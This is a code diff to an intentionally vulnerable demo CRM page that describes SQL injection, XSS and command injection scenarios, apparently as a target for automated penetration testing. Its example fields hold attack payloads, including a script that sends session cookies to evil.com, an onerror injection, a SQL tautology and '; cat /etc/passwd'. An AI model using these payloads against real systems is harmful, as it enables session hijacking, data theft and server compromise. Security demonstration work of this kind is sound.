@@ -9,22 +9,22 @@ interface VD { id: string; icon: string; title: string; tag: string; tagColor: s
 const VULNS: VD[] = [
   { id:"sqli", icon:"\uD83D\uDD13", title:"SQL Injection", tag:"CRITICAL", tagColor:"#ef4444", accentColor:"#ef4444",
     description:"Discover how unsanitized database queries can bypass authentication and extract sensitive data. Also demonstrates IDOR — sequential profile IDs are accessible with no auth check.",
-    href:"/crm/security/profile",
+    href:"/crm/accounts",
     bi:{ scenario:"CRM User Profile Lookup", risk:"Attacker modifies SQL queries via account search to dump the customer database. This endpoint also demonstrates IDOR (Insecure Direct Object Reference) — sequential numeric profile IDs are accessible with no auth check, so any user can enumerate all records.", impact:"Complete exposure of all customer PII including names, emails, phone numbers, and account details stored in the PostgreSQL database. Revenue forecast data and deal pipeline values become visible to competitors or malicious actors. Regulatory violations under GDPR, CCPA, and SOC 2 resulting in potential fines and mandatory breach notifications. Loss of customer trust and reputational damage if the breach becomes public, along with potential legal liability from affected customers.", example:"' OR 1=1 -- returns all customer records." },
     video:"/videos/sql-injection.mp4"},
   { id:"xss", icon:"\u26A1", title:"Cross-Site Scripting (XSS)", tag:"HIGH", tagColor:"#f59e0b", accentColor:"#f59e0b",
     description:"Learn about reflected and stored XSS that allows malicious script injection into web pages.",
-    href:"/crm/security/comments",
+    href:"/crm/my-opportunities",
     bi:{ scenario:"CRM Comments & Notes", risk:"An attacker posts a malicious script inside an opportunity comment or account note. When any sales rep, manager, or executive opens that record, the script silently executes in their browser — stealing their Cognito session token and sending it to an external server. Because comments are visible to the entire team, a single injected payload can compromise every user who views the record, creating a worm-like chain of session hijacking across the organization.", impact:"Mass session hijacking across all CRM users, unauthorized access to pipeline data and customer PII, potential for automated data exfiltration disguised as legitimate user activity, and reputational damage if customer-facing data is altered.", example:"<script>fetch('https://evil.com/steal?token='+document.cookie)</script> embedded in an opportunity comment silently exfiltrates session cookies from every viewer." },
     video:"/videos/cross-site-scripting.mp4"},
   { id:"xss2", icon:"\uD83D\uDCA5", title:"Advanced XSS", tag:"HIGH", tagColor:"#f59e0b", accentColor:"#a855f7",
     description:"Explore DOM-based and attribute-based XSS that exploits client-side JavaScript.",
-    href:"/crm/security/xss-advanced",
+    href:"/crm/pipeline",
     bi:{ scenario:"Dashboard Widgets & Custom Fields", risk:"An attacker crafts a malicious URL containing JavaScript in query parameters or hash fragments and shares it with CRM users (e.g., via email or Slack as a 'pipeline filter link'). When a user clicks the link, the CRM dashboard renders the attacker's payload directly into the DOM — manipulating what the user sees, injecting fake data into pipeline views, or presenting a convincing credential-harvesting form that overlays the real UI. Because the attack happens entirely client-side, server-side logging never detects it.", impact:"Manipulated dashboard data leading to incorrect business decisions, credential theft through fake login overlays that bypass server-side detection, targeted phishing of high-value users like sales directors or executives, and potential for persistent DOM manipulation that alters deal values or forecast numbers.", example:"A shared link like /crm/pipeline?filter=<img src=x onerror=alert(document.cookie)> injects script execution when the page renders the filter parameter into the DOM without sanitization." },
     video:"/videos/advanced-xss.mp4"},
   { id:"cmdi", icon:"\uD83D\uDCBB", title:"Command Injection", tag:"CRITICAL", tagColor:"#ef4444", accentColor:"#3b82f6",
     description:"Explore how unsanitized input to system commands enables arbitrary code execution.",
-    href:"/crm/security/tools",
+    href:"/crm/team",
     bi:{ scenario:"Team Performance Export (CSV/PDF)", risk:"The CRM's Team Performance page includes an 'Export CSV' feature that lets managers export individual rep performance data. Under the hood, the export filename and filter parameters are passed to an operating system command for file generation without sanitization. An attacker enters shell metacharacters (;, |, &&) in the name filter field before exporting — injecting arbitrary commands that execute on the Lambda server with full runtime permissions. This grants the attacker the ability to read environment variables containing database credentials, access the VPC-connected RDS instance, enumerate the file system, and potentially pivot to other AWS resources using the Lambda execution role's IAM permissions.", impact:"Complete server compromise with access to database credentials stored in environment variables, full read access to the PostgreSQL customer database via the VPC connection, ability to exfiltrate all CRM data including PII, revenue forecasts, and deal pipeline, potential lateral movement to other AWS services using the Lambda role, and risk of persistent backdoor installation through the export functionality.", example:"Entering '; cat /etc/passwd' in the name filter field before clicking Export CSV causes the backend to execute the injected command alongside the export, revealing server user accounts and confirming arbitrary command execution." },
     video:"/videos/command-injection-vulnerability.mp4"},
 ];
@@ -128,6 +128,13 @@ const SecurityPage = () => {
   return (
     <div>
 
+      {/* PURPOSE BANNER */}
+      <div style={{ background:"#0d1b2a", borderBottom:"1px solid rgba(255,255,255,0.08)", padding:"14px 40px", textAlign:"center" }}>
+        <p style={{ margin:0, fontSize:"13px", color:"#94a3b8", lineHeight:1.6, maxWidth:"800px", marginLeft:"auto", marginRight:"auto" }}>
+          This is a sample CRM application built solely as a target for <strong style={{ color:"#e2e8f0" }}>AWS Security Agent</strong> to run design reviews, security requirements analysis, and penetration tests against. It is not a real product.
+        </p>
+      </div>
+
       {/* HERO */}
       <div style={{ background:"linear-gradient(180deg,#0a1628 0%,#0d2137 60%,#0f2b46 100%)", padding:"100px 40px 80px", textAlign:"center", position:"relative", overflow:"hidden", minHeight:"420px", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center" }}>
         {/* Subtle dot grid */}
@@ -138,7 +145,7 @@ const SecurityPage = () => {
         <motion.div initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.6 }} style={{ position:"relative", zIndex:1, maxWidth:"720px", width:"100%" }}>
           {/* Badge */}
           <div style={{ display:"inline-flex", alignItems:"center", gap:"6px", background:"rgba(255,255,255,0.07)", border:"1px solid rgba(255,255,255,0.1)", borderRadius:"20px", padding:"5px 14px", marginBottom:"28px", fontSize:"12px", color:"#94a3b8", letterSpacing:"0.02em" }}>
-            {"\u2728"} Frontier Agent
+            {"\u2728"} Managed autonomous AI agent
           </div>
 
           {/* Title */}
